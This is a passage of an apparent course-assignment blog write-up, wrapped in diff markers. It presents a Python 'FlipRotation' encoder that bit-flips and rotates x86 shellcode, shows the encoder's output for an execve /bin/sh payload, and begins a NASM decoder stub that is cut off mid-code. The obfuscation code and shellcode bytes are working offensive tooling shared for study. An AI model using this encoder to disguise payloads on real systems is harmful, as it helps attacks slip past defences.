+</span></span><span style="display:flex;"><span>        encoder<span style="color:#f92672">.</span>complement_encoding(shellcode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> enc_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;xor&#34;</span>:
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        encoder <span style="color:#f92672">=</span> Encoder(enc_type, key)
+</span></span><span style="display:flex;"><span>        encoder<span style="color:#f92672">.</span>xor_encoding_backslashX(shellcode)<span style="color:#75715e"># utf-8 encoding (\x4b,\xe4,...)</span>
+</span></span><span style="display:flex;"><span>        encoder<span style="color:#f92672">.</span>xor_encoding_0x(shellcode) <span style="color:#75715e"># hex format (0x4b, 0xe4,...)</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> enc_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;insertion&#34;</span>:
+</span></span><span style="display:flex;"><span>        encoder <span style="color:#f92672">=</span> Encoder(enc_type, key)    <span style="color:#75715e"># providing a key with insertion encoding type</span>
+</span></span><span style="display:flex;"><span>        encoder<span style="color:#f92672">.</span>insertion_encode(shellcode) <span style="color:#75715e"># call insertion code with target shellcode as argument</span>
+</span></span><span style="display:flex;"><span>           
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] Encode type not supported. Please check the supported algorithms in the help menu&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    banner() <span style="color:#75715e"># displays the program banner</span>
+</span></span><span style="display:flex;"><span>    main()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">--------------------&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Hack the World!&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;--------------------&#34;</span>)
+</span></span><span style="display:flex;"><span>    print()
+</span></span><span style="display:flex;"><span>    print()
+</span></span></code></pre></div><p>The <code>Encoder</code> class is is able to generate a pseudorandom key or use one provided by the user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">randomKeyGenerator</span>(self):
+</span></span><span style="display:flex;"><span>        byte <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>            hexDigits <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0x05</span>,<span style="color:#ae81ff">0x06</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0x09</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x0b</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x0e</span>,<span style="color:#ae81ff">0x0f</span>]
+</span></span><span style="display:flex;"><span>            nibble <span style="color:#f92672">=</span> secretsGenerator<span style="color:#f92672">.</span>choice(hexDigits) <span style="color:#75715e"># it gets in decimal not hex format</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#print(&#34;nibble----&#34;+hex(nibble)[2:])</span>
+</span></span><span style="display:flex;"><span>            byte <span style="color:#f92672">=</span> byte <span style="color:#f92672">+</span> hex(nibble)[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e"># hex class is str type. Appending to 0x</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#print(byte)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#chr(int(byte,16)) # converts from base 16 to integer (decimal) and then to ascii (chr func) </span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#print(int(byte,16))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> int(byte,<span style="color:#ae81ff">16</span>) <span style="color:#75715e"># convert key to bytes and return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> __init__(self,enc_type, key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> enc_type <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;not&#34;</span>:
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> key <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[*] Key Provided by the user. Doing magic with it&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>randomKeyGenerator()
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[*] Doing magic with a (pseudo) Random key&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] Key: &#34;</span><span style="color:#f92672">+</span>hex(self<span style="color:#f92672">.</span>key))
+</span></span></code></pre></div><p>Then, we can call the function <code>insertion_encode</code> and provide the target shellcode as argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>encoder <span style="color:#f92672">=</span> Encoder(enc_type, key)    <span style="color:#75715e"># providing a key with insertion encoding type</span>
+</span></span><span style="display:flex;"><span>encoder<span style="color:#f92672">.</span>insertion_encode(shellcode) <span style="color:#75715e"># call insertion code with target shellcode as argument</span>
+</span></span></code></pre></div><p>The <code>insertion_encode</code> function is defined as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insertion_encode</span>(self, shellcode):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#75715e"># 0x format</span>
+</span></span><span style="display:flex;"><span>        encoded2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#75715e"># \x format</span>
+</span></span><span style="display:flex;"><span>        rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        rotation_counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> shellbyte <span style="color:#f92672">in</span> shellcode:
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            flipped_shellbyte <span style="color:#f92672">=</span> shellbyte <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x01</span>    <span style="color:#75715e"># flip lowest bit</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> bin(flipped_shellbyte)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0&#39;</span>:
+</span></span><span style="display:flex;"><span>                logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Flipped byte - odd - &#34;</span><span style="color:#f92672">+</span>str(flipped_shellbyte))
+</span></span><span style="display:flex;"><span>                rotated_shellbyte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>rightRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> ) <span style="color:#75715e"># 8 because we are rotating with 8 bits</span>
+</span></span><span style="display:flex;"><span>                rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x02&#39;</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Flipped byte - even - &#34;</span><span style="color:#f92672">+</span>str(flipped_shellbyte))
+</span></span><span style="display:flex;"><span>                rotated_shellbyte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>leftRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> )  <span style="color:#75715e"># 8 because we are rotating with 8 bits</span>
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;After rotation: &#34;</span><span style="color:#f92672">+</span> bin2hex(self<span style="color:#f92672">.</span>leftRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span><span style="color:#ae81ff">8</span>)))
+</span></span><span style="display:flex;"><span>                rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0xff&#39;</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            final_shellbyte <span style="color:#f92672">=</span>  bin2hex(rotated_shellbyte)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            rotation_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            encoded <span style="color:#f92672">+=</span> final_shellbyte <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> rotation_direction <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span>  <span style="color:#75715e"># \x format</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> final_shellbyte[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> rotation_direction[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e"># \x format</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x format: &#34;</span>)
+</span></span><span style="display:flex;"><span>        encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:]   <span style="color:#75715e"># add marker</span>
+</span></span><span style="display:flex;"><span>        print(encoded2)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] 0x format: &#34;</span>)
+</span></span><span style="display:flex;"><span>        encoded <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e">#add marker</span>
+</span></span><span style="display:flex;"><span>        print(encoded)
+</span></span></code></pre></div><p>We started by interating each shellcode byte and flipping the least significant bit - <code>flipped_shellbyte</code></p>
+<p>After that, checking that same bit for parity. if it is <code>1</code> is odd but if is <code>0</code> is even. An odd number will rotate right and an even rotate left. Before proceeeding to the rotation we convert the byte to binary in order to have a more robust rotation. The <code>rotation_counter</code> is used as a reference for the number of rotated bits.</p>
+<p>Also as each byte has 8 bits in size, the rotation is performed according to a circular shift methodology by using the modulus <code>%</code> operator. Using the remainder we stick to rotate only a maximum of 7 bits each time.</p>
+<p>After performing the rotation and convert the binary number to hexadecimal the encoding is completed - <code>final_shellbyte</code>. We can append it to the variables where the shellcode is being stored <code>encoded</code> and <code>encoded2</code> followed by the <code>rotation_direction</code> (0x02 or 0xfff).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> bin(flipped_shellbyte)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0&#39;</span>:
+</span></span><span style="display:flex;"><span>    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Flipped byte - odd - &#34;</span><span style="color:#f92672">+</span>str(flipped_shellbyte))
+</span></span><span style="display:flex;"><span>    rotated_shellbyte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>rightRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> ) <span style="color:#75715e"># 8 because we are rotating with 8 bits</span>
+</span></span><span style="display:flex;"><span>    rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x02&#39;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Flipped byte - even - &#34;</span><span style="color:#f92672">+</span>str(flipped_shellbyte))
+</span></span><span style="display:flex;"><span>    rotated_shellbyte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>leftRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> )  <span style="color:#75715e"># 8 because we are rotating with 8 bits</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;After rotation: &#34;</span><span style="color:#f92672">+</span> bin2hex(self<span style="color:#f92672">.</span>leftRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span><span style="color:#ae81ff">8</span>)))
+</span></span><span style="display:flex;"><span>    rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0xff&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>final_shellbyte <span style="color:#f92672">=</span>  bin2hex(rotated_shellbyte)
+</span></span><span style="display:flex;"><span>rotation_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">+=</span> final_shellbyte <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> rotation_direction <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span>  <span style="color:#75715e"># \x format</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> final_shellbyte[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> rotation_direction[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e"># \x format</span>
+</span></span></code></pre></div><p>The last part, we add the end marker at the end for each shellcode format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x format: &#34;</span>)
+</span></span><span style="display:flex;"><span>encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:]   <span style="color:#75715e"># add marker</span>
+</span></span><span style="display:flex;"><span>print(encoded2)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] 0x format: &#34;</span>)
+</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e">#add marker</span>
+</span></span><span style="display:flex;"><span>print(encoded)
+</span></span></code></pre></div><h4 id="encoder-output">Encoder Output<a hidden class="anchor" aria-hidden="true" href="#encoder-output">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ python3 flipRotation_Encoder.py 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        _______________________________________________________________
+</span></span><span style="display:flex;"><span>         &lt;The <span style="color:#e6db74">&#34;FlipRotation&#34;</span> Encoder - Bit flip and rotate your shellcode
+</span></span><span style="display:flex;"><span>        ---------------------------------------------------------------
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">\ </span>  ^__^
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">\ </span>  <span style="color:#f92672">(</span>oo<span style="color:#f92672">)</span><span style="color:#ae81ff">\_</span>______
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">(</span>__<span style="color:#f92672">)</span><span style="color:#ae81ff">\ </span>      <span style="color:#f92672">)</span><span style="color:#ae81ff">\/\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                    <span style="color:#f92672">||</span>----w |
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">||</span>     <span style="color:#f92672">||</span>       
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Shellcode length: <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Shellcode: b<span style="color:#e6db74">&#39;1\xc0Ph//shh/bin\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Key Provided by the user. Doing magic with it
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Key: 0xa0
+</span></span><span style="display:flex;"><span>After rotation: 0x83
+</span></span><span style="display:flex;"><span>After rotation: 0x45
+</span></span><span style="display:flex;"><span>After rotation: 0x4b
+</span></span><span style="display:flex;"><span>After rotation: 0xb4
+</span></span><span style="display:flex;"><span>After rotation: 0x69
+</span></span><span style="display:flex;"><span>After rotation: 0x8d
+</span></span><span style="display:flex;"><span>After rotation: 0xf6
+</span></span><span style="display:flex;"><span>After rotation: 0xa8
+</span></span><span style="display:flex;"><span>After rotation: 0xc7
+</span></span><span style="display:flex;"><span>After rotation: 0x36
+</span></span><span style="display:flex;"><span>After rotation: 0x81
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#ae81ff">\x</span> format: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>30<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>83<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>45<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>4b<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>71<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>c9<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>b4<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>8d<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>d<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>f6<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>44<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>8b<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>a8<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>c7<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>94<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>11<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>e<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>36<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>28<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>99<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>81<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>a0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 0x format: 
+</span></span><span style="display:flex;"><span>0x30,0x02,0x83,0xff,0x45,0xff,0x4b,0xff,0xe2,0x02,0x71,0x02,0xc9,0x02,0xb4,0xff,0x69,0xff,0x17,0x02,0x8d,0xff,0xd,0x02,0xf6,0xff,0x44,0x02,0x8b,0x02,0xa8,0xff,0x88,0x02,0xc7,0xff,0x94,0x02,0x11,0x02,0xe,0x02,0x36,0xff,0x28,0x02,0x99,0x02,0x81,0xff,0xa0,0xa0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>We have the encoded shellcode already with rotatio direction for each byte and the end marker.</p>
+<h3 id="decoder">Decoder<a hidden class="anchor" aria-hidden="true" href="#decoder">#</a></h3>
+<p>I said before that it was simpler than the conder but it was not easy at all. I needed to use a piece of paper and a pencil to develop the logic to decode the payload in assembly.</p>
+<p>Let&rsquo;s dig into the assembly</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Student ID   : PA-31319
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Student Name : Eduardo Silva
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Assignment 4 : Custom Encoder/Decoder Shellcode (Linux/x86) Assembly - FlipRotation Encoder
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; File Name    : flipRotation_decoder.nasm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">call_decoder</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>decoder:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">esi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">1</span>]	<span style="color:#75715e">; pointing to second byte (0x02) from shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>        <span style="color:#75715e">; keep track parity byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cdq</span>					<span style="color:#75715e">; zeroes edx. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>,	<span style="color:#ae81ff">1</span> 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ebx</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>decode:
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>]	<span style="color:#75715e">; mov parity byte to bl
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0xa0</span>				<span style="color:#75715e">; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">jz</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">EncodedShellcode</span>	<span style="color:#75715e">; reached the marker if Zero Flag not set
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x5f</span>	<span style="color:#75715e">; if equal, parity is even (0xff)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">edx</span>] 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">jnz</span> <span style="color:#66d9ef">odd</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>even:	<span style="color:#75715e">; rotate right
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ror</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">cl</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">bitFlip</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>odd: 	<span style="color:#75715e">; rotate left
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
